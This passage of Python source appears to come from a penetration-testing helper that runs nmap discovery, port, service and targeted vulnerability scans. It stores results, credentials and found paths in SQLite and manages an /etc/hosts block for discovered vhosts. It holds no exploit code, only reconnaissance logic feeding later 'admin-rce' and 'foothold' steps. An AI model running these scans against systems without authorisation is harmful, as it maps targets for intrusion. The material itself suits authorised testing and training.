    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        return conn.execute(query, params).fetchall()
    except sqlite3.OperationalError:
        return []
    finally:
        conn.close()


def _save_spawn_command(command: str) -> "int | None":
    """Persist a to-be-spawned command and return its row id. The in-app OSC marker carries
    only this id (never the command text), so untrusted scan output on the same terminal
    channel can't forge a command into the spawn path — the host app reads the command back
    from pshunter.db by id, mirroring the report-replay (`psspawn`) design."""
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            cur = conn.execute("INSERT INTO spawn_commands (command, created) VALUES (?, ?)",
                               (command, now))
            conn.commit()
            return cur.lastrowid
        finally:
            conn.close()


def fetch_ports(ip: str) -> list:
    """(port, proto, state) rows for a host, TCP first then UDP, ascending port."""
    rows = _fetch("SELECT port, proto, state FROM ports WHERE ip = ?", (ip,))
    return sorted(rows, key=lambda r: (r[1], r[0]))


def fetch_services(ip: str) -> dict:
    """{(port, proto): (name, product, version, cpe)} for a host."""
    rows = _fetch("SELECT port, proto, name, product, version, cpe FROM services WHERE ip = ?", (ip,))
    return {(p, pr): (n, prod, ver, cpe) for p, pr, n, prod, ver, cpe in rows}


def save_services(ip: str, rows: list, source: "str | None" = None) -> int:
    """Upsert probed service data (-sV) by (ip, port, proto), overwriting the earlier
    port-enum guess with the real name/product/version/cpe. ``source='manual'`` tags
    user-entered rows; a scanned upsert never clears an existing tag (COALESCE)."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                conn.execute(
                    "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                    "first_seen, last_seen, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                    "  name     = COALESCE(excluded.name, name), "
                    "  product  = COALESCE(excluded.product, product), "
                    "  version  = COALESCE(excluded.version, version), "
                    "  cpe      = COALESCE(excluded.cpe, cpe), "
                    "  last_seen = excluded.last_seen, "
                    "  source   = COALESCE(excluded.source, source)",
                    (ip, r["port"], r["proto"], r.get("name"), r.get("product"),
                     r.get("version"), r.get("cpe"), now, now, source),
                )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


def save_scripts(ip: str, rows: list) -> int:
    """Upsert NSE script output by (ip, port, proto, script) — port 0 = host-level —
    and, in the same transaction, extract any finding from each script into the vulns
    table (so both -sC and vuln-scan output feed the findings summary, no re-scan)."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                sid = r.get("id")
                if not sid:
                    continue
                port, proto, output = int(r.get("port") or 0), r.get("proto") or "", r.get("output")
                conn.execute(
                    "INSERT INTO scripts (ip, port, proto, script, output, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto, script) DO UPDATE SET "
                    "  output = excluded.output, last_seen = excluded.last_seen",
                    (ip, port, proto, sid, output, now, now),
                )
                f = _extract_finding(sid, output or "")
                if f:
                    conn.execute(
                        "INSERT INTO vulns (ip, port, proto, script, state, cve, risk, summary, "
                        "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                        "ON CONFLICT(ip, port, proto, script) DO UPDATE SET "
                        "  state = excluded.state, cve = excluded.cve, risk = excluded.risk, "
                        "  summary = excluded.summary, last_seen = excluded.last_seen",
                        (ip, port, proto, sid, f["state"], f["cve"], f["risk"], f["summary"], now, now),
                    )
                for hn in _extract_hostnames(ip, sid, output or ""):     # cert SANs, redirects, SMB FQDN
                    conn.execute(
                        "INSERT INTO hostnames (ip, port, hostname, source, first_seen, last_seen) "
                        "VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(ip, hostname) DO UPDATE SET "
                        "  last_seen = excluded.last_seen",
                        (ip, port, hn, sid, now, now),
                    )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


# a plausible DNS hostname (has a dot, valid label chars, not a bare IP)
_HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)([a-z0-9_](?:[a-z0-9_-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$")


def _valid_hostname(name: str, ip: str) -> "str | None":
    """Normalise & validate a candidate hostname; None if it isn't a usable DNS name."""
    n = (name or "").strip().lower().rstrip(".")
    if n.startswith("*."):                       # wildcard cert → keep the base domain
        n = n[2:]
    if not n or n == ip:
        return None
    if _HOSTNAME_RE.match(n) and not n.replace(".", "").isdigit():
        return n
    return None


def _extract_hostnames(ip: str, sid: str, output: str) -> set:
    """Pull DNS names out of one NSE script's output — TLS cert CN/SAN (ssl-cert), HTTP
    redirect targets (http-title/http-*), and SMB FQDN/domain (smb-os-discovery). These
    domains/vhosts are gold for phase 5 (add to /etc/hosts, vhost-fuzz)."""
    if not output:
        return set()
    cands = []
    if "ssl-cert" in sid or "ssl-" in sid:
        cands += re.findall(r"DNS:([A-Za-z0-9_.*-]+)", output)
        cands += re.findall(r"(?:commonName|CN)=([A-Za-z0-9_.*-]+)", output)
    if sid == "vhost-fuzz":                       # our sweep marks hits with "  + <host>"
        cands += re.findall(r"^\s*\+ ([A-Za-z0-9_.-]+)", output, re.M)
    if sid.startswith("http-"):
        cands += re.findall(r"redirect to https?://([A-Za-z0-9_.-]+)", output, re.I)
        cands += re.findall(r"[Ll]ocation:\s*https?://([A-Za-z0-9_.-]+)", output)
    if sid == "smb-os-discovery":
        for pat in (r"FQDN:\s*(\S+)", r"Domain name:\s*(\S+)", r"DNS_?[Dd]omain[_ ]?[Nn]ame:\s*(\S+)",
                    r"Forest name:\s*(\S+)"):
            cands += re.findall(pat, output)
    if sid == "smb-enum":                         # our report header: 'Host: X   OS: …   Domain: Y'
        dom = re.search(r"Domain:\s*(\S+)", output)
        host = re.search(r"Host:\s*(\S+)", output)
        if dom:
            cands.append(dom.group(1))
            if host and host.group(1) not in ("?", ""):
                cands.append(f"{host.group(1)}.{dom.group(1)}")
    return {h for h in (_valid_hostname(c, ip) for c in cands) if h}


def save_hostnames(ip: str, entries: list) -> None:
    """Store validated DNS names for a host (dedup by (ip, hostname)). ``entries`` is a
    list of {'port', 'hostname', 'source'} — e.g. nmap's per-service resolved name."""
    if not ip or not entries or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for e in entries:
                hn = _valid_hostname(e.get("hostname"), ip)
                if not hn:
                    continue
                conn.execute(
                    "INSERT INTO hostnames (ip, port, hostname, source, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(ip, hostname) DO UPDATE SET "
                    "  last_seen = excluded.last_seen",
                    (ip, int(e.get("port") or 0), hn, e.get("source") or "service", now, now))
            conn.commit()
        finally:
            conn.close()
    _sync_hosts_block(ip)             # keep the managed /etc/hosts block current (root only)


def fetch_hostnames(ip: str) -> list:
    """(hostname, port, source) DNS names discovered for a host, for phase-5 vhost work."""
    rows = _fetch("SELECT hostname, port, source FROM hostnames WHERE ip = ? ORDER BY hostname", (ip,))
    return rows


# ── manual findings (user-entered) ────────────────────────────────────────────
# The scanner only records what it saw; a tester often knows more — a port behind a
# knock, a vhost from a report, creds from another box, a page found by hand. These
# helpers top up the DB so the downstream scans/tools pick the extra surface up.
# Hosts/ports/services/hostnames reuse the normal save_* upserts. Creds and paths are
# stored as synthetic script rows (`manual-creds` / `manual-paths`) in the exact line
# format their consumers already parse, so a tool only needs the new sid added next to
# default-creds / dir-brute — no new source of truth.

def _load_manual_block(ip: str, port: int, proto: str, sid: str) -> dict:
    """Parse an existing manual script row into {host: [lines]} (order preserved)."""
    blocks, host = {}, None
    for s, output in fetch_scripts(ip, port, proto):
        if s != sid:
            continue
        for ln in (output or "").splitlines():
            mh = re.match(r"^\[([^\]\s]+)\]\s*$", ln)
            if mh:
                host = mh.group(1)
                blocks.setdefault(host, [])
            elif ln.strip() and host is not None:
                blocks[host].append(ln)
    return blocks


def _save_manual_block(ip: str, port: int, proto: str, sid: str, blocks: dict) -> None:
    """Re-render {host: [lines]} to a `[host]`-sectioned body and upsert the script row."""
    lines = []
    for host, entries in blocks.items():
        if not entries:
            continue
        lines.append(f"[{host}]")
        lines.extend(entries)
    save_scripts(ip, [{"id": sid, "port": port, "proto": proto, "output": "\n".join(lines)}])


def add_manual_path(ip: str, port: int, proto: str, host: str, path: str) -> None:
    """Record a user-found path/page under `manual-paths` in dir-brute's `+ 200 /path`
    format so every path-gathering tool (param/idor/upload/xxe/priv) surfaces it."""
    blocks = _load_manual_block(ip, port, proto, "manual-paths")
    entries = blocks.setdefault(host, [])
    line = f"+ 200  {path}"
    if line not in entries:
        entries.append(line)
    _save_manual_block(ip, port, proto, "manual-paths", blocks)


def add_manual_cred(ip: str, port: int, proto: str, host: str, user: str,
                    pw: str, path: str, kind: str) -> None:
    """Record user-supplied valid credentials under `manual-creds` in default-creds'
    `! user:pass @ /path (form) [host]` format so admin-rce / idor / foothold reuse them."""
    blocks = _load_manual_block(ip, port, proto, "manual-creds")
    entries = blocks.setdefault(host, [])
    line = f"! {user}:{pw or '<blank>'} @ {path} ({kind}) [{host}]"
    if line not in entries:
        entries.append(line)
    _save_manual_block(ip, port, proto, "manual-creds", blocks)


def fetch_manual(ip: str) -> list:
    """(port, proto, sid, output) rows the user entered by hand (creds + paths)."""
    return _fetch("SELECT port, proto, script, output FROM scripts WHERE ip = ? "
                  "AND script IN ('manual-paths', 'manual-creds') ORDER BY port, script", (ip,))


# ── managed /etc/hosts block ──────────────────────────────────────────────────
# Discovered vhosts are useless in a browser / name-based tools until they resolve, and
# the only OS-wide way to do that is /etc/hosts (glibc reads it hard-coded; no alternate
# file, no include). So — WHEN RUNNING AS ROOT — we maintain one marked block per target
# IP, rebuilt from the DB. The block is treated as EPHEMERAL session state: it is stripped
# on startup (surviving a crash / SIGKILL / terminal close, unlike an exit-only hook — the
# same reasoning as _chown_db_to_user) and best-effort removed again at exit. Without root
# we never touch the file; the user gets a paste-ready line instead.
HOSTS_PATH = "/etc/hosts"
_HOSTS_LOCK = threading.Lock()
_HOSTS_LEDGER = os.path.join(os.path.dirname(DB_PATH), "hosts_ledger.json")
_HOSTS_BLOCK_RE = re.compile(
    r"\n?# >>> pshunter (?P<ip>\S+) >>>\n.*?\n# <<< pshunter (?P=ip) <<<\n?", re.S)


def _read_hosts() -> str:
    with open(HOSTS_PATH, encoding="utf-8", errors="replace") as fh:
        return fh.read()


def _write_hosts(text: str) -> None:
    """Atomically replace /etc/hosts (temp in the same dir → os.replace). Needs root."""
    d = os.path.dirname(HOSTS_PATH) or "/"
    fd, tmp = tempfile.mkstemp(prefix=".pshunter-hosts-", dir=d)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(text)
        os.replace(tmp, HOSTS_PATH)
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def _strip_pshunter_blocks(text: str, ip: "str | None" = None) -> str:
    """Remove our marked block(s) — one IP's, or all of them if ip is None."""
    if ip is None:
        return _HOSTS_BLOCK_RE.sub("\n", text)
    pat = re.compile(
        rf"\n?# >>> pshunter {re.escape(ip)} >>>\n.*?\n# <<< pshunter {re.escape(ip)} <<<\n?", re.S)
    return pat.sub("\n", text)


def _ledger_load() -> list:
    try:
        with open(_HOSTS_LEDGER, encoding="utf-8") as fh:
            data = json.load(fh)
        return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


def _ledger_save(ips: list) -> None:
    try:
        with open(_HOSTS_LEDGER, "w", encoding="utf-8") as fh:
            json.dump(sorted(set(ips)), fh)
    except OSError:
        pass


def _hosts_snippet(ip: str) -> "str | None":
    """A ready-to-paste one-liner adding all of an IP's discovered names in one go."""
    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    if not names:
        return None
    return f"sudo sh -c 'echo \"{ip}  {' '.join(names)}\" >> /etc/hosts'"


def _sync_hosts_block(ip: str) -> None:
    """Rebuild the managed /etc/hosts block for one IP from the DB. Root only; silent
    no-op otherwise (the launch notice / findings snippet tell the user what to do)."""
    if not ip or _is_self_ip(ip) or not _is_root():
        return
    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    with _HOSTS_LOCK:
        try:
            text = _read_hosts()
        except OSError:
            return
        new = _strip_pshunter_blocks(text, ip)
        if names:
            if not new.endswith("\n"):
                new += "\n"
            new += (f"# >>> pshunter {ip} >>>\n{ip}  {' '.join(names)}\n"
                    f"# <<< pshunter {ip} <<<\n")
        if new != text:
            try:
                _write_hosts(new)
            except OSError:
                return
        led = _ledger_load()
        if names and ip not in led:
            _ledger_save(led + [ip])
        elif not names and ip in led:
            _ledger_save([x for x in led if x != ip])


def _remove_all_pshunter_hosts() -> None:
    """Strip every managed block — used for startup reconciliation and the atexit hook."""
    if not _is_root():
        return
    with _HOSTS_LOCK:
        try:
            text = _read_hosts()
        except OSError:
            return
        new = _strip_pshunter_blocks(text)
        if new != text:
            try:
                _write_hosts(new)
            except OSError:
                pass
    _ledger_save([])


def _reconcile_hosts_on_start() -> None:
    """Clear any residue from a previous (possibly crashed) session. As root we strip it;
    without root we can't write the file, so we just point out the leftovers + the fix."""
    if _is_root():
        _remove_all_pshunter_hosts()
        return
    try:
        text = _read_hosts()
    except OSError:
        return
    if "# >>> pshunter " in text:
        print(f"{YELLOW}⚠ leftover pshunter /etc/hosts entries from a previous session{RESET} "
              f"{DIM}— clean with: sudo sed -i '/# >>> pshunter/,/# <<< pshunter/d' /etc/hosts{RESET}")


def save_os(ip: str, os_name: str) -> None:
    """Store the detected OS on the host row (overwrites a previous guess)."""
    if not ip or not os_name or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(
                "INSERT INTO hosts (ip, os, first_seen, last_seen) VALUES (?, ?, ?, ?) "
                "ON CONFLICT(ip) DO UPDATE SET os = excluded.os, last_seen = excluded.last_seen",
                (ip, os_name, now, now))
            conn.commit()
        finally:
            conn.close()


def fetch_host_os(ip: str) -> "str | None":
    rows = _fetch("SELECT os FROM hosts WHERE ip = ?", (ip,))
    return rows[0][0] if rows and rows[0][0] else None


def fetch_scripts(ip: str, port: int, proto: str) -> list:
    """(script, output) rows for one port (proto '' + port 0 = host-level scripts)."""
    return _fetch("SELECT script, output FROM scripts WHERE ip = ? AND port = ? AND proto = ?",
                  (ip, port, proto))


def fetch_scripted_ports(ip: str) -> set:
    """{(port, proto)} that carry per-port NSE script output — i.e. the ports where
    there's more to see (from service detection / vuln scan)."""
    rows = _fetch("SELECT DISTINCT port, proto FROM scripts WHERE ip = ? AND port != 0", (ip,))
    return {(p, pr) for p, pr in rows}


def fetch_vulns(ip: str) -> list:
    """(port, proto, script, state, cve, risk, summary) findings for a host."""
    rows = _fetch("SELECT port, proto, script, state, cve, risk, summary FROM vulns WHERE ip = ?", (ip,))
    return sorted(rows, key=lambda r: (r[0], r[2]))


def fetch_step_status(ip: str, port: int, proto: str, service: str) -> dict:
    """{step_index: status} for one service's checklist on a host ('done' / 'skip')."""
    rows = _fetch("SELECT step, status FROM exploit_steps WHERE ip = ? AND port = ? "
                  "AND proto = ? AND service = ?", (ip, port, proto, service))
    return {step: status for step, status in rows}


def set_step_status(ip: str, port: int, proto: str, service: str, step: int,
                    status: "str | None") -> None:
    """Persist one checklist step's status; status None clears it back to 'to-do'."""
    if not ip or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            if status is None:
                conn.execute("DELETE FROM exploit_steps WHERE ip = ? AND port = ? AND "
                             "proto = ? AND service = ? AND step = ?",
                             (ip, port, proto, service, step))
            else:
                conn.execute(
                    "INSERT INTO exploit_steps (ip, port, proto, service, step, status, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto, service, step) DO UPDATE SET "
                    "  status = excluded.status, last_seen = excluded.last_seen",
                    (ip, port, proto, service, step, status, now))
            conn.commit()
        finally:
            conn.close()


# ── background jobs (feed [s] status) ─────────────────────────────────────────
_JOBS: list = []
_JOBS_LOCK = threading.Lock()


# ── job persistence (status history survives across app restarts) ─────────────
def _job_insert(job: dict) -> None:
    """Insert a new job row and stash its rowid on the job for later updates."""
    with _DB_LOCK:
        conn = _db_connect()
        try:
            cur = conn.execute(
                "INSERT INTO jobs (created, phase, name, command, state, hosts, error, output, run) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (job["created"], job["phase"], job["name"], job["command"],
                 job["state"], job["hosts"], job["error"], job["output"], job.get("run")))
            job["db_id"] = cur.lastrowid
            conn.commit()
        finally:
            conn.close()


def _job_update(job: dict) -> None:
    """Persist the job's current state / host count / error / captured output."""
    if job.get("db_id") is None:
        return
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(
                "UPDATE jobs SET state = ?, hosts = ?, error = ?, output = ? WHERE id = ?",
                (job["state"], job["hosts"], job["error"], job["output"], job["db_id"]))
            conn.commit()
        finally:
            conn.close()


def _load_jobs() -> None:
    """Reload the saved command history into _JOBS at startup. A job left 'running'
    from a previous session is no longer alive, so it is loaded (and persisted) as
    'aborted'."""
    if not os.path.exists(DB_PATH):
        return
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        rows = conn.execute("SELECT id, created, phase, name, command, state, hosts, "
                            "error, output, run FROM jobs ORDER BY id").fetchall()
    except sqlite3.OperationalError:      # jobs table not created yet
        return
    finally:
        conn.close()
    corrected = []
    with _JOBS_LOCK:
        _JOBS.clear()
        for jid, created, phase, name, command, state, hosts, error, output, run in rows:
            st = "aborted" if state == "running" else state
            job = {"db_id": jid, "created": created, "phase": phase, "name": name,
                   "command": command, "state": st, "hosts": hosts or 0,
                   "found": set(), "error": error, "output": output,
                   "run": run or f"job{jid}",    # pre-run-column jobs group as singletons
                   "cancel": threading.Event()}
            _JOBS.append(job)
            if st != state:
                corrected.append(job)
    for job in corrected:                 # write back the running->aborted fix
        _job_update(job)


def _next_run_id() -> str:
    """A unique id for one phase execution (the batch of commands launched together).
    Time-based so it never collides with a run id reloaded from a previous session."""
    return str(time.time_ns())


def _new_job(phase: str, name: str, command: str, run: "str | None" = None) -> dict:
    # each phase execution shares one run id so status can group its commands; a job with
    # no explicit run (single-command phases) gets its own, i.e. its own status entry.
    job = {
        "phase": phase, "name": name, "command": command, "run": run or _next_run_id(),
        "state": "running", "hosts": 0, "found": set(), "error": None, "output": None,
        "cancel": threading.Event(),
        "created": datetime.now().isoformat(timespec="seconds"), "db_id": None,
    }
    _job_insert(job)                      # assigns job["db_id"]
    with _JOBS_LOCK:
        _JOBS.append(job)
    return job


def _run_pass(job: dict, args: list, targets: list, deadline: float) -> None:
    """Run one nmap pass, streaming live hosts to the DB and the job's found set.
    Honours job['cancel'] so status can abort a running scan. The job's state, host
    count and captured console output are persisted (output feeds the report view)."""
    def _on_hosts(batch):
        live = [h for h in batch if not _is_self_ip(h["ip"])]
        if live:
            save_hosts(live)
            job["found"].update(h["ip"] for h in live)
            job["hosts"] = len(job["found"])
            _job_update(job)
    try:
        hosts, output = _run_nmap(args, targets, _on_hosts, deadline=deadline,
                                  should_stop=job["cancel"].is_set)
        job["output"] = output
        if hosts is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_discovery(parsed: dict, minutes: int) -> None:
    """Fast and thorough passes run concurrently; their results are unioned into the
    DB. The whole phase shares one time budget — each pass is hard-capped at the full
    budget (not a split), so both may use all the minutes the user allowed."""
    _refresh_own_addresses()          # pick up any IP change since the last scan
    targets = parsed["targets"]
    deadline = max(1, minutes * 60)
    name = _PHASES["0"][0]
    run = _next_run_id()
    threads = []
    for args in (_DISCOVERY_FAST, _DISCOVERY_SLOW):
        command = " ".join(["nmap"] + args + targets)
        job = _new_job("0", name, command, run)
        t = threading.Thread(target=_run_pass, args=(job, args, targets, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_discovery(parsed: dict, minutes: int) -> None:
    """Launch discovery (both passes) in the background; the menu stays free."""
    threading.Thread(target=_run_discovery, args=(parsed, minutes), daemon=True).start()


# ── port enumeration (phase 2) ────────────────────────────────────────────────
# Runs several nmap port scans concurrently on one host, streaming open ports to the
# DB. A fast top-1000 (T4) gives an immediate working set; the full 65535-port TCP
# sweep is split into two halves at T3 (reliability over speed — completeness matters
# and T4 can miss ports on rate-limited/laggy targets); a top-100 UDP scan (root only)
# covers the common UDP services. -sV/-sC are deliberately left to the service phase.
def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


def _port_scan_specs() -> list:
    """(label, nmap-args) for the concurrent port scans. SYN scan needs root; fall
    back to a TCP connect scan otherwise. UDP is added only when root."""
    tcp = "-sS" if _is_root() else "-sT"
    specs = [
        ("fast",    [tcp, "-Pn", "-n", "--open", "-T4", "--top-ports", "1000"]),
        ("full-lo", [tcp, "-Pn", "-n", "--open", "-T3", "-p", "1-32767"]),
        ("full-hi", [tcp, "-Pn", "-n", "--open", "-T3", "-p", "32768-65535"]),
    ]
    if _is_root():
        specs.append(("udp", ["-sU", "-Pn", "-n", "--open", "-T4", "--top-ports", "100"]))
    return specs


def _run_port_pass(job: dict, args: list, ip: str, deadline: float) -> None:
    """Run one port scan on ``ip``, streaming open ports (and any service guess) to the
    DB. Honours job['cancel']; persists state, port count and captured output."""
    found = set()

    def _on_items(batch):
        for h in batch:
            rows = h.get("ports")
            if rows and not _is_self_ip(h["ip"]):
                save_ports(h["ip"], rows)
                found.update((r["port"], r["proto"]) for r in rows)
                job["hosts"] = len(found)
                _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_ports_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_port_enum(ip: str, minutes: int) -> None:
    """Concurrent port scans on one host, sharing one time budget (each capped at the
    full budget). The fast scan lands ports early while the full/UDP scans finish."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])          # make sure the target shows in the hosts list
    deadline = max(1, minutes * 60)
    name = _PHASES["1"][0]
    run = _next_run_id()
    threads = []
    for _label, args in _port_scan_specs():
        command = " ".join(["nmap"] + args + [ip])
        job = _new_job("1", name, command, run)
        t = threading.Thread(target=_run_port_pass, args=(job, args, ip, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_port_enum(ip: str, minutes: int) -> None:
    """Launch port enumeration in the background; the menu stays free."""
    threading.Thread(target=_run_port_enum, args=(ip, minutes), daemon=True).start()


# ── service detection (phase 3) ───────────────────────────────────────────────
# Deep identification on the open ports from phase 2: -sV probes real versions and
# -sC runs the default NSE scripts (titles, certs, SMB/SSH/HTTP info) — the payload
# of this phase. OS detection runs as its OWN scan (`-O --osscan-guess`, root only)
# because -O needs an open AND a closed port, so it must not be pinned to the open-
# port list (that yields nmap's "OS detection unreliable" warning). -A is avoided for
# the same reason (its bundled -O would be unreliable) plus its traceroute noise.
def _service_scan_specs(ip: str) -> list:
    """(label, nmap-args) for service detection on ``ip``'s known-open ports. TCP gets
    -sV -sC; UDP (root) gets -sU -sV; OS (root) gets its own unrestricted -O scan."""
    ports = fetch_ports(ip)
    tcp = [str(p) for p, proto, _s in ports if proto == "tcp"]
    udp = [str(p) for p, proto, _s in ports if proto == "udp"]
    specs = []
    if tcp:
        specs.append(("service", ["-sV", "-sC", "-Pn", "-n", "-T4", "-p", ",".join(tcp)]))
    if udp and _is_root():
        specs.append(("service-udp", ["-sU", "-sV", "-Pn", "-n", "-T4", "-p", ",".join(udp)]))
    if _is_root():
        specs.append(("os", ["-O", "--osscan-guess", "-Pn", "-n", "-T4"]))
    return specs


def _run_service_pass(job: dict, args: list, ip: str, deadline: float) -> None:
    """Run one service-detection scan, streaming probed services / NSE output / OS to
    the DB. Honours job['cancel']; persists progress and captured output."""
    counter = [0]

    def _on_items(batch):
        for h in batch:
            if _is_self_ip(h["ip"]):
                continue
            svc, scr, os_name = h.get("services") or [], h.get("scripts") or [], h.get("os")
            if svc:
                save_services(h["ip"], svc)
            if scr:
                save_scripts(h["ip"], scr)            # also extracts cert/redirect/SMB hostnames
            if h.get("hostnames"):
                save_hostnames(h["ip"], h["hostnames"])
            if os_name:
                save_os(h["ip"], os_name)
            counter[0] += len(svc) + len(scr) + (1 if os_name else 0)
            job["hosts"] = counter[0]
            _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_detail_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_service_detection(ip: str, minutes: int) -> None:
    """Concurrent service-detection scans on one host, sharing one time budget."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])
    deadline = max(1, minutes * 60)
    name = _PHASES["2"][0]
    run = _next_run_id()
    threads = []
    for _label, args in _service_scan_specs(ip):
        command = " ".join(["nmap"] + args + [ip])
        job = _new_job("2", name, command, run)
        t = threading.Thread(target=_run_service_pass, args=(job, args, ip, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_service_detection(ip: str, minutes: int) -> None:
    """Launch service detection in the background; the menu stays free."""
    threading.Thread(target=_run_service_detection, args=(ip, minutes), daemon=True).start()


# ── vuln scan (phase 4) ───────────────────────────────────────────────────────
# Targeted NSE, driven by the services already in the DB — not a blind --script vuln.
# For each open port we look up its service and fire only the relevant checks: active
# CVE tests (vuln category) plus auth-weakness checks (anonymous / empty / default
# creds — the auth category, never brute). All script names are verified to ship with
# nmap. brute / dos / exploit are excluded; rdp-vuln-ms12-020 (can crash a host) is
# left out by default. SSL scripts run on any TLS-wrapped port. Findings in the
# standard NSE `vuln` format (State: VULNERABLE) are parsed into the vulns table.
_SSL = "ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params"
_VULN_SCRIPTS = {
    "microsoft-ds": "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-vuln-ms10-061,smb-vuln-cve2009-3103,smb-double-pulsar-backdoor,"
                    "smb-security-mode,smb2-security-mode,smb-enum-users",
    "netbios-ssn":  "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-security-mode,smb-enum-users",
    "http":         "http-shellshock,http-vuln-cve2017-5638,http-vuln-cve2015-1635,"
                    "http-vuln-cve2014-3704,http-vuln-cve2012-1823,http-vuln-cve2017-1001000,"
                    "http-vuln-misfortune-cookie,http-default-accounts,http-auth-finder,"
                    "http-config-backup,http-git,http-webdav-scan",
    "ms-wbt-server": "rdp-ntlm-info",
    "ftp":          "ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-anon",
    "ssh":          "ssh-auth-methods,ssh-publickey-acceptance",
    "telnet":       "telnet-encryption",
    "smtp":         "smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764",
    "mysql":        "mysql-vuln-cve2012-2122,mysql-empty-password",
    "ms-sql":       "ms-sql-empty-password",
    "oracle":       "oracle-enum-users",
    "mongodb":      "mongodb-databases",
    "redis":        "redis-info",
    "vnc":          "realvnc-auth-bypass,vnc-info,vnc-title",
    "snmp":         "snmp-info",
    "x11":          "x11-access",
    "rmi":          "rmi-vuln-classloader",
    "rsync":        "rsync-list-modules",
    "distcc":       "distcc-cve2004-2687",
    "clamav":       "clamav-exec",
    "irc":          "irc-unrealircd-backdoor",
}
_VULN_PORT_FALLBACK = {
    445: "microsoft-ds", 139: "netbios-ssn", 80: "http", 443: "http", 8080: "http",
    8443: "http", 3389: "ms-wbt-server", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
    465: "smtp", 587: "smtp", 3306: "mysql", 1433: "ms-sql", 1521: "oracle",
    27017: "mongodb", 6379: "redis", 5900: "vnc", 161: "snmp", 1099: "rmi", 873: "rsync",
    3632: "distcc", 3310: "clamav", 6667: "irc", 6000: "x11", 6001: "x11",
}
_TLS_PORTS = {443, 465, 563, 636, 853, 990, 992, 993, 995, 8443}
# auth-category scripts that only emit output when they actually find a weakness, so
# any output is a finding (anonymous / empty / default creds, unauth access).
_AUTH_FINDING = {"ftp-anon", "mysql-empty-password", "ms-sql-empty-password",
                 "http-default-accounts", "x11-access", "redis-info",
                 "mongodb-databases", "rsync-list-modules", "snmp-info"}


def _vuln_key(name: "str | None", port: int) -> "str | None":
    if name:
        low = name.lower()
        for key in _VULN_SCRIPTS:
            if key in low:
                return key
    return _VULN_PORT_FALLBACK.get(port)


def _vuln_families(ip: str) -> list:
    """Group the host's open ports into (label, scripts, [ports]) families so each
    family runs one targeted scan. SSL scripts are added for TLS-wrapped ports."""
    services = fetch_services(ip)
    groups: dict = {}    # key -> [scripts, set(ports)]
    for port, proto, _state in fetch_ports(ip):
        name = (services.get((port, proto)) or (None, None, None))[0]
        key = _vuln_key(name, port)
